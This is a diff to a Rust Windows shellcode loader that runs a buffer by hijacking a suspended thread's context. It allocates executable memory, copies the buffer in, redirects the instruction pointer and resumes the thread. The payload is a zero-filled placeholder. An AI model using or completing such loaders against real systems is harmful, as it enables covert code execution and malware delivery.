@@ -1,17 +1,19 @@
 use std::ffi::c_void;
+#[cfg(target_arch = "x86_64")]
+use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_AMD64;
 #[cfg(target_arch = "arm")]
 use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_ARM;
 #[cfg(target_arch = "aarch64")]
 use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_ARM64;
 #[cfg(target_arch = "x86")]
 use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_X86;
-#[cfg(target_arch = "x86_64")]
-use windows::Win32::System::Diagnostics::Debug::{CONTEXT_ALL_AMD64, CONTEXT_FLAGS};
 use windows::{
     Win32::{
-        Foundation::{CloseHandle, GetLastError},
+        Foundation::{CloseHandle, HANDLE},
         System::{
-            Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext, WriteProcessMemory},
+            Diagnostics::Debug::{
+                CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext, WriteProcessMemory,
+            },
             Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
             Threading::{
                 CREATE_SUSPENDED, CreateThread, GetCurrentProcess, INFINITE, ResumeThread, Sleep,
@@ -19,7 +21,7 @@ use windows::{
             },
         },
     },
-    core::{Error, HRESULT, Result},
+    core::Result,
 };
 
 #[cfg(target_arch = "x86_64")]
@@ -31,67 +33,88 @@ const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_ARM;
 #[cfg(target_arch = "aarch64")]
 const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_ARM64;
 
+struct HandleGuard(HANDLE);
+
+impl Drop for HandleGuard {
+    fn drop(&mut self) {
+        unsafe {
+            if !self.0.is_invalid() {
+                let _ = CloseHandle(self.0);
+            }
+        }
+    }
+}
+
 fn main() -> Result<()> {
     let shellcode: [u8; 460] = [0x00; 460];
 
-    unsafe {
-        let h_memory = VirtualAlloc(
+    let h_memory = unsafe {
+        VirtualAlloc(
             None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
-        );
+        )
+    };
 
-        if h_memory.is_null() {
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+    if h_memory.is_null() {
+        return Ok(());
+    }
 
-        let mut bytes_written: usize = 0;
+    let mut bytes_written = 0usize;
+
+    unsafe {
         WriteProcessMemory(
             GetCurrentProcess(),
             h_memory,
             shellcode.as_ptr().cast(),
             shellcode.len(),
             Some(&mut bytes_written),
-        )?;
+        )?
+    }
 
-        let mut thread_id: u32 = 0;
-        let h_thread = CreateThread(
+    let mut thread_id = 0u32;
+
+    let h_thread = HandleGuard(unsafe {
+        CreateThread(
             None,
             0,
             Some(dummy),
             None,
             THREAD_CREATION_FLAGS(CREATE_SUSPENDED.0),
             Some(&mut thread_id),
-        )?;
+        )?
+    });
 
-        Sleep(5_000);
+    unsafe { Sleep(5_000) }
 
-        let mut ctx = CONTEXT::default();
-        ctx.ContextFlags = CONTEXT_ALL;
-        GetThreadContext(h_thread, &mut ctx)?;
-
-        #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
-        {
-            ctx.Rip = h_memory as u64;
-        }
-
-        #[cfg(target_arch = "x86")]
-        {
-            ctx.Eip = h_memory as u32;
-        }
-
-        #[cfg(target_arch = "arm")]
-        {
-            ctx.Pc = h_memory as u32;
-        }
-
-        SetThreadContext(h_thread, &ctx)?;
-        ResumeThread(h_thread);
-
-        WaitForSingleObject(h_thread, INFINITE);
-        CloseHandle(h_thread)?;
+    let mut ctx = CONTEXT {
+        ContextFlags: CONTEXT_ALL,
+        ..Default::default()
     };
+
+    unsafe { GetThreadContext(h_thread.0, &mut ctx)? }
+
+    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
+    {
+        ctx.Rip = h_memory as u64;
+    }
+
+    #[cfg(target_arch = "x86")]
+    {
+        ctx.Eip = h_memory as u32;
+    }
+
+    #[cfg(target_arch = "arm")]
+    {
+        ctx.Pc = h_memory as u32;
+    }
+
+    unsafe {
+        SetThreadContext(h_thread.0, &ctx)?;
+        ResumeThread(h_thread.0);
+        WaitForSingleObject(h_thread.0, INFINITE);
+    }
 
     Ok(())
 }
